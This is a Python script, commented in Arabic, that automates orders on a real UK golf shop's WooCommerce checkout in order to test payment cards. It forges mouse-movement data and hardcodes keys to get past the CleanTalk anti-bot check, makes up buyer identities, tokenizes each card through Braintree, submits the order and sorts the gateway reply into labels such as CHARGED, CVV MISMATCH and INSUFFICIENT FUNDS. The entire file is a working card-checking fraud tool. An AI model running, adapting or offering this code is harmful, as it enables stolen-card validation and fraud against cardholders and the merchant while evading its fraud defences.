# ==================== gatet.py (النسخة النهائية مع الريكويستات الجديدة) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

def clean_html(text):
    """إزالة HTML tags من النص"""
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    """استخراج السبب بعد 'Reason:'"""
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_pointer_data():
    """تولد بيانات حركة ماوس عشوائية تشبه الإنسان"""
    pointer_data = []
    start_time = random.randint(30000, 90000)
    
    for i in range(random.randint(2, 5)):
        x = random.randint(200, 700)
        y = random.randint(50, 400)
        timestamp = start_time + random.randint(5000, 20000) * i
        pointer_data.append([x, y, timestamp])
    
    return json.dumps(pointer_data).replace(' ', '')

def extract_cleantalk_values(session, url):
    """تستخرج ct_checkjs و apbct_visible_fields من الصفحة"""
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        ct_checkjs = None
        checkjs_input = soup.find('input', {'name': 'ct_checkjs'})
        if checkjs_input:
            ct_checkjs = checkjs_input.get('value')
        
        apbct_visible = None
        visible_input = soup.find('input', {'id': 'apbct_visible_fields'})
        if not visible_input:
            visible_input = soup.find('input', {'name': 'apbct_visible_fields'})
        if visible_input:
            apbct_visible = visible_input.get('value')
        
        return ct_checkjs, apbct_visible
    except Exception as e:
        print(f"[!] Error extracting CleanTalk values: {e}")
        return None, None

def generate_valid_uk_data():
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    uk_postcodes = ['YO1 8SU', 'SW1A1AA', 'M11AE', 'B11TT', 'LS11UR', 'G11XU', 'EH11QQ', 'CF101EP', 'NE11EE', 'L11JA']
    uk_cities = ['York', 'London', 'Manchester', 'Birmingham', 'Leeds', 'Glasgow', 'Edinburgh', 'Cardiff', 'Newcastle', 'Liverpool']
    uk_phones = ['07712345678', '07890123456', '07987654321', '07412345678', '07567890123', '07789123456']
    uk_addresses = ['Flat 2, Popes Head Court', '10 Downing Street', '221B Baker Street', 'Buckingham Palace Road', 'Abbey Road']
    
    # إيميلات من دومينات متعددة
    email_domains = ['@yahoo.com', '@hotmail.com', '@outlook.com', '@icloud.com', '@aol.com', 
                     '@protonmail.com', '@mail.com', '@gmx.com', '@yandex.com', '@zoho.com']
    email_domain = random.choice(email_domains)
    
    return {
        'first_name': first,
        'last_name': last,
        'email': f"{first.lower()}.{last.lower()}{random.randint(1,999)}{email_domain}",
        'phone': random.choice(uk_phones),
        'address_1': random.choice(uk_addresses),
        'city': random.choice(uk_cities),
        'postcode': random.choice(uk_postcodes).replace(' ', ''),
        'company': f"{first}'s {random.choice(['Golf', 'Sports', 'Retail', 'Ltd', 'Shop'])}" if random.choice([True, False]) else ''
    }

def ch(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    user = generate_user_agent()
    fake_data = generate_valid_uk_data()
    session_id = str(uuid.uuid4())
    correlation_id = str(uuid.uuid4())[:24]
    r = requests.session()
    
    # ================ القيم الجديدة من الريكويستات ================
    CT_SFW_PASS_KEY = '3f45678ad003807a74ad5e754cbffb020'
    SWPEXT = '55b87fed4f0a9ea8b89efe91cbdd1f7b'
    WOOCOMMERCE_CART_HASH = 'b103003b3b7b332d1d3f417d04445ade'
    
    # ================ استخراج قيم CleanTalk المتغيرة ================
    product_url = 'https://www.expressgolf.co.uk/product/4-yards-more-tees-4-pack/'
    
    initial_response = r.get(product_url)
    ct_checkjs, apbct_visible_fields = extract_cleantalk_values(r, product_url)
    
    if not ct_checkjs:
        ct_checkjs = '3f6280b1f540be05f340d33f9d2c7b1978d48f5bccbc455cdc521db6e2a5ea37'
        print("[!] Using fallback ct_checkjs")
    if not apbct_visible_fields:
        apbct_visible_fields = 'eyIwIjp7InZpc2libGVfZmllbGRzIjoicXVhbnRpdHkiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6ImF0dHJpYnV0ZV9wYV9jb2xvdXIgd29vYnRfaWRzIGFkZC10by1jYXJ0IHByb2R1Y3RfaWQgdmFyaWF0aW9uX2lkIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6NX19'
        print("[!] Using fallback apbct_visible_fields")
    
    # توليد بيانات متغيرة
    ct_pointer_data = generate_pointer_data()
    ct_ps_timestamp = str(int(time.time()) + random.randint(100, 500))
    apbct_site_landing_ts = str(int(time.time()) - random.randint(1000, 10000))
    
    print(f"[+] CleanTalk - ct_checkjs: {ct_checkjs[:30]}...")
    print(f"[+] CleanTalk - pointer_data: {ct_pointer_data[:50]}...")
    
    # ================ 1. ADD TO CART (منتج جديد 4 Yards More Tees) ================
    product_url = 'https://www.expressgolf.co.uk/product/4-yards-more-tees-4-pack/'
    
    params_get = {'attribute_pa_colour': 'driver'}
    r.get(product_url, params=params_get)
    
    cookies_add = {
        'swpext86386': SWPEXT,
        'cp-impression-added-forcp_id_87a52': 'true',
        'cp_id_87a52': 'true',
        'ct_sfw_pass_key': CT_SFW_PASS_KEY,
        'ct_checkjs': ct_checkjs,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'ct_mouse_moved': 'true',
        'apbct_site_landing_ts': apbct_site_landing_ts,
        'ct_pointer_data': ct_pointer_data,
        'ct_ps_timestamp': ct_ps_timestamp,
    }
    
    files = {
        'attribute_pa_colour': (None, 'driver'),
        'woobt_ids': (None, ''),
        'quantity': (None, '1'),
        'add-to-cart': (None, '595286'),
        'product_id': (None, '595286'),
        'variation_id': (None, '595287'),
        'apbct_visible_fields': (None, apbct_visible_fields),
    }
    
    headers_add = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'en-US',
        'origin': 'https://www.expressgolf.co.uk',
        'referer': f'{product_url}?attribute_pa_colour=driver',
        'user-agent': user,
        'upgrade-insecure-requests': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    response = r.post(product_url, headers=headers_add, files=files, cookies=cookies_add)
    if response.status_code != 200:
        return f'ADD_TO_CART_FAILED'
    
    # ================ 2. UPDATE SHIPPING METHOD (جديد) ================
    headers_shipping = {
        'accept': '*/*',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.expressgolf.co.uk',
        'referer': 'https://www.expressgolf.co.uk/basket/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_shipping = {'wc-ajax': 'update_shipping_method'}
    data_shipping = {
        'security': '2b707e95b2',
        'shipping_method[0]': 'local_pickup:79',
    }
    
    response = r.post('https://www.expressgolf.co.uk/', params=params_shipping, headers=headers_shipping, data=data_shipping)
    
    # ================ 3. CHECKOUT PAGE ================
    headers_checkout = {
        'Accept-Language': 'en-US',
        'Referer': 'https://www.expressgolf.co.uk/basket/',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': user,
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    response = r.get('https://www.expressgolf.co.uk/checkout/', headers=headers_checkout)
    if response.status_code != 200:
        return f'CHECKOUT_PAGE_FAILED'
    
    # ================ 4. EXTRACT TOKENS AND NONCES ================
    enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
    if not enc:
        return 'CLIENT_TOKEN_NOT_FOUND'
    dec = base64.b64decode(enc.group(1)).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
    if not au:
        return 'FINGERPRINT_NOT_FOUND'
    au = au[0]
    
    sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
    if not sec:
        return 'UPDATE_ORDER_NONCE_NOT_FOUND'
    sec = sec.group(1)
    
    check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
    if not check:
        return 'CHECKOUT_NONCE_NOT_FOUND'
    check = check.group(1)
    
    # ================ 5. UPDATE ORDER REVIEW ================
    billing_email = fake_data['email']
    billing_first = fake_data['first_name']
    billing_last = fake_data['last_name']
    billing_company = fake_data['company']
    billing_address = fake_data['address_1']
    billing_city = fake_data['city']
    billing_postcode = fake_data['postcode'].replace(' ', '')
    billing_phone = fake_data['phone']
    
    headers_update = {
        'accept': '*/*',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.expressgolf.co.uk',
        'referer': 'https://www.expressgolf.co.uk/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_update = {'wc-ajax': 'update_order_review'}
    
    data_update = f'security={sec}&payment_method=braintree_cc&country=GB&state=Yorkshire&postcode={billing_postcode}&city={billing_city}&address={billing_address.replace(" ", "+")}&address_2=&s_country=GB&s_state=Yorkshire&s_postcode={billing_postcode}&s_city={billing_city}&s_address={billing_address.replace(" ", "+")}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3D%26wc_order_attribution_referrer%3Dhttps%253A%252F%252Fwww.expressgolf.co.uk%252Fshop%252Faccessories%252Ftees%252F%26wc_order_attribution_utm_campaign%3D%26wc_order_attribution_utm_source%3D%26wc_order_attribution_utm_medium%3D%26wc_order_attribution_utm_content%3D%26wc_order_attribution_utm_id%3D%26wc_order_attribution_utm_term%3D%26wc_order_attribution_utm_source_platform%3D%26wc_order_attribution_utm_creative_format%3D%26wc_order_attribution_utm_marketing_tactic%3D%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.expressgolf.co.uk%252Fproduct%252Fchamp-pro-fly-tees-4-pack%252F%26wc_order_attribution_session_start_time%3D2026-05-11%252009%253A07%253A54%26wc_order_attribution_session_pages%3D6%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_email%3D{billing_email}%26billing_first_name%3D{billing_first}%26billing_last_name%3D{billing_last}%26billing_company%3D{billing_company}%26billing_country%3DGB%26wc_address_validation_postcode_lookup_postcode%3D%26billing_address_1%3D{billing_address.replace(" ", "%20")}%26billing_address_2%3D%26billing_city%3D{billing_city}%26billing_state%3DYorkshire%26billing_postcode%3D{billing_postcode}%26billing_phone%3D{billing_phone}%26wc_apbct_email_id%3D%26mailchimp_woocommerce_newsletter%3D1%26shipping_first_name%3D{billing_first}%26shipping_last_name%3D{billing_last}%26shipping_company%3D%26shipping_country%3DGB%26wc_address_validation_postcode_lookup_postcode%3D%26shipping_address_1%3D{billing_address.replace(" ", "%20")}%26shipping_address_2%3D%26shipping_city%3D{billing_city}%26shipping_state%3DYorkshire%26shipping_postcode%3D{billing_postcode}%26order_comments%3D%26shipping_method%255B0%255D%3Dlocal_pickup%253A79%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=local_pickup%3A79'
    
    response = r.post('https://www.expressgolf.co.uk/', params=params_update, headers=headers_update, data=data_update)
    
    # ================ 6. TOKENIZE CREDIT CARD ================
    headers_token = {
        'accept': '*/*',
        'accept-language': 'en-US',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': user,
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    token_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': session_id,
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                    'billingAddress': {
                        'postalCode': billing_postcode,
                        'streetAddress': billing_address[:50],
                    },
                },
                'options': {'validate': False},
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=token_data)
    try:
        tok = response.json()['data']['tokenizeCreditCard']['token']
    except:
        return f'TOKENIZATION_FAILED'
    
    # ================ 7. FINAL CHECKOUT ================
    cookies_final = {
        'swpext86386': SWPEXT,
        'cp-impression-added-forcp_id_87a52': 'true',
        'cp_id_87a52': 'true',
        'ct_sfw_pass_key': CT_SFW_PASS_KEY,
        'ct_checkjs': ct_checkjs,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'ct_mouse_moved': 'true',
        'ct_has_scrolled': 'true',
        'apbct_site_landing_ts': apbct_site_landing_ts,
        'ct_pointer_data': ct_pointer_data,
        'ct_ps_timestamp': ct_ps_timestamp,
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': WOOCOMMERCE_CART_HASH,
        'apbct_site_referer': '0',
    }
    
    headers_final = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.expressgolf.co.uk',
        'referer': 'https://www.expressgolf.co.uk/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_final = {'wc-ajax': 'checkout'}
    
    data_final = f'wc_order_attribution_source_type=&wc_order_attribution_referrer=https%3A%2F%2Fwww.expressgolf.co.uk%2Fshop%2Faccessories%2Ftees%2F&wc_order_attribution_utm_campaign=&wc_order_attribution_utm_source=&wc_order_attribution_utm_medium=&wc_order_attribution_utm_content=&wc_order_attribution_utm_id=&wc_order_attribution_utm_term=&wc_order_attribution_utm_source_platform=&wc_order_attribution_utm_creative_format=&wc_order_attribution_utm_marketing_tactic=&wc_order_attribution_session_entry=https%3A%2F%2Fwww.expressgolf.co.uk%2Fproduct%2Fchamp-pro-fly-tees-4-pack%2F&wc_order_attribution_session_start_time=2026-05-11+09%3A07%3A54&wc_order_attribution_session_pages=6&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_email={billing_email}&billing_first_name={billing_first}&billing_last_name={billing_last}&billing_company={billing_company}&billing_country=GB&billing_address_1={billing_address.replace(" ", "+")}&billing_address_2=&billing_city={billing_city}&billing_state=Yorkshire&billing_postcode={billing_postcode}&billing_phone={billing_phone}&shipping_first_name={billing_first}&shipping_last_name={billing_last}&shipping_company=&shipping_country=GB&shipping_address_1={billing_address.replace(" ", "+")}&shipping_address_2=&shipping_city={billing_city}&shipping_state=Yorkshire&shipping_postcode={billing_postcode}&order_comments=&shipping_method%5B0%5D=local_pickup%3A79&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&apbct_visible_fields={apbct_visible_fields}'
    
    response = r.post('https://www.expressgolf.co.uk/', params=params_final, headers=headers_final, data=data_final, cookies=cookies_final)
    
    # ================ 8. PARSE RESULT ================
    try:
        result_data = json.loads(response.text)
        messages = result_data.get("messages", "")
        full_response = response.text
    except:
        return 'PARSE_ERROR'
    
    clean_messages = clean_html(messages)
    clean_full = clean_html(full_response)
    search_text = clean_messages + " " + clean_full
    
    reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
    reason = reason_match.group(1).strip() if reason_match else None
    
    print(f"[DEBUG] Clean response: {search_text[:300]}")
    
    # ================ ردود Braintree الكاملة ================
    
    if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
        return 'CHARGED'
    
    if 'insufficient funds' in search_text:
        return 'INSUFFICIENT FUNDS'
    
    if 'cvv' in search_text or 'cvv2 failure' in search_text or 'cvv verification failed' in search_text:
        return 'CVV MISMATCH'
    
    if 'expired card' in search_text:
        return 'EXPIRED CARD'
    
    if 'do not honor' in search_text:
        return 'DO NOT HONOR'
    
    if 'closed card' in search_text:
        return 'CLOSED CARD'
    
    if 'call issuer' in search_text:
        return 'CALL ISSUER'
    
    if 'pick up card' in search_text or 'pickup card' in search_text:
        return 'PICK UP CARD'
    
    if '3d secure' in search_text or 'three_d_secure' in search_text:
        return '3D SECURE REQUIRED'
    
    if 'limit exceeded' in search_text:
        return 'LIMIT EXCEEDED'
    
    if 'lost or stolen' in search_text:
        return 'LOST/STOLEN CARD'
    
    if 'address verification' in search_text or 'avs' in search_text:
        return 'ADDRESS MISMATCH'
    
    if 'processor declined' in search_text:
        return 'PROCESSOR DECLINED'
    
    if 'invalid card' in search_text or 'invalid card number' in search_text:
        return 'INVALID CARD'
    
    if 'no account' in search_text or 'no_account' in search_text:
        return 'NO ACCOUNT'
    
    if 'card not activated' in search_text:
        return 'CARD NOT ACTIVATED'
    
    if 'cannot authorize at this time' in search_text or 'cannot authorize' in search_text:
        return 'CANNOT AUTHORIZE (POLICY)'
    
    if 'card type is not accepted' in search_text or 'card type not accepted' in search_text:
        return 'CARD TYPE NOT ACCEPTED'
    
    if 'restriction on the card' in search_text or 'issuer restriction' in search_text:
        return 'CARD RESTRICTION'
    
    if 'cleantalk suspect' in search_text or 'cleantalk' in search_text:
        if 'fraud' in search_text:
            return 'CLEANTALK FRAUD SUSPECT'
        else:
            return 'CLEANTALK SUSPECT'
    
    if 'gateway rejected: fraud' in search_text or 'gateway reject fraud' in search_text:
        return 'GATEWAY REJECTED FRAUD'
    
    if 'risk_threshold' in search_text or 'risk threshold' in search_text:
        return 'RISK THRESHOLD'
    
    if 'processor declined - fraud suspected' in search_text:
        return 'PROCESSOR DECLINED - FRAUD SUSPECTED'
    
    if 'call issuer. pick up card' in search_text:
        return 'CALL ISSUER - PICK UP CARD'
    
    if 'email does not exist' in search_text or 'email doesn\'t exist' in search_text:
        return 'EMAIL DOES NOT EXIST'
    
    if 'fraud' in search_text or 'suspected fraud' in search_text:
        return 'SUSPECTED FRAUD'
    
    if 'declined' in search_text:
        return 'DECLINED'
    
    if reason and len(reason) < 40:
        return reason.upper()
    
    if clean_messages and len(clean_messages) < 60:
        return clean_messages.title()
    
    return 'DECLINED'
